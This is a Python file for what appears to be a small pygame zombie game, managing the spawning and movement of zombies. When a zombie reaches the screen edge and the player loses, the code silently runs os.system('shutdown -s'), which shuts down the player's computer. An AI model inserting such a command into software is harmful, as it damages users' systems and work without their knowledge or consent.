import time 
from zombax import zombax
import random
import os

class zombie_manager:

    def __init__(self, pygame_instance, minspeed, maxspeed, minspawnrate, maxspawnrate):
        self.zombie_minspeed = minspeed
        self.zombie_maxspeed = maxspeed
        self.zombie_list = []
        zombie_minspawnrate = minspawnrate
        zombie_maxspawnrate = maxspawnrate
        self.zombie_spawnrate = (zombie_minspawnrate, zombie_maxspawnrate)
        screen_info = pygame_instance.display.Info()
        self.width, self.height = screen_info.current_w, screen_info.current_h
        self.pygame_instance = pygame_instance
        from threading import Thread 
        t = Thread(target = self.timer) 
        t.start()  

  
    def timer(self): # faire spawner les zombies a une intervalle aléatoire
        while True: 
            #n -= 1
            time.sleep(random.randrange(self.zombie_spawnrate[0], self.zombie_spawnrate[1]))
            self.zombie_list.append(zombax(random.randint(self.zombie_minspeed, self.zombie_maxspeed), self.pygame_instance))

    def getZombies(self):
        return(self.zombie_list)
    
    def moveZombies(self):
        for zombax in self.getZombies():
            zombax.getPos()[0] -= zombax.getSpeed()
            if zombax.getPos()[0] < 0: # perdu !
                self.getZombies().remove(zombax)
                del zombax
                os.system('shutdown -s')


